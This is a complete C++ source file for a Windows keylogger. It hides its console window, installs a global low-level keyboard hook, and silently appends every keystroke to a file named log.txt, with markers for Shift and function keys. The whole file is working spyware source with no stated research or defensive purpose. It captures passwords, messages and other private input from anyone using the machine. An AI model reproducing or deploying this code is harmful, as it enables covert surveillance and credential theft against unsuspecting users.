#include <cstdio>
#include <Windows.h>
#include <string>

#pragma comment(lib, "User32")

HHOOK hHook = NULL;

LRESULT CALLBACK KBHookCallback(int nCode, WPARAM wParam, LPARAM lParam);
int SaveChar(char print);
int SaveStr(char *print);
int SaveInt(int print);

int Shift_Down = 0;

void p(char c)
{

	printf("%c", c);
	SaveChar(c);
	return;
}

int main()
{

	FreeConsole();

	MSG msg;

	hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KBHookCallback, 0, 0);

	while (!GetMessage(&msg, 0, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

int SaveChar(char print)
{
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen("log.txt", "a+");
	fprintf(OUTPUT_FILE, "%c", print);
	fclose(OUTPUT_FILE);
	return 0;
}

int SaveInt(int print)
{
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen("log.txt", "a+");
	fprintf(OUTPUT_FILE, "[%d]", print);
	fclose(OUTPUT_FILE);
	return 0;
}

int SaveStr(char *print)
{
	FILE *OUTPUT_FILE;
	OUTPUT_FILE = fopen("log.txt", "a+");
	fprintf(OUTPUT_FILE, "%s", print);
	fclose(OUTPUT_FILE);
	
	return 0;
}

LRESULT CALLBACK KBHookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
	PKBDLLHOOKSTRUCT kbStruct = (KBDLLHOOKSTRUCT*)(lParam);
	if (wParam == WM_KEYDOWN)
	{
		int Key = (int)kbStruct->vkCode;
		if ((Key >= 48) && (Key <= 90))
		{
			if (Shift_Down == 1)
			{
				p((char )Key);
			}
			else
			{
				p((char )tolower(Key));
			}
		}
		else if (Key == VK_RETURN)
		{
			printf("\n");
			SaveStr("\n");
		}
		else if (Key == 32)
		{
			p(' ');
		}
		else if (Key == 160 || Key == 161)
		{
			Shift_Down = 1;
			printf("[SHFT]");
			SaveStr("[SHFT]");
		}
		else if (Key >= 112 && Key <= 136)
		{
			p('F');
			p((char )Key - 111);
		}
		else
		{
			printf("[%d]", Key);
			SaveInt(Key);

		}
	}


	else if (wParam == WM_KEYUP)
	{
		int Key = (int)kbStruct->vkCode;
		if (Key == 160 || Key == 161)
		{
			Shift_Down = 0;
			printf("[/SHFT]");
			SaveStr("[/SHFT]");
		}
	}
	return CallNextHookEx(hHook, nCode, wParam, lParam);
}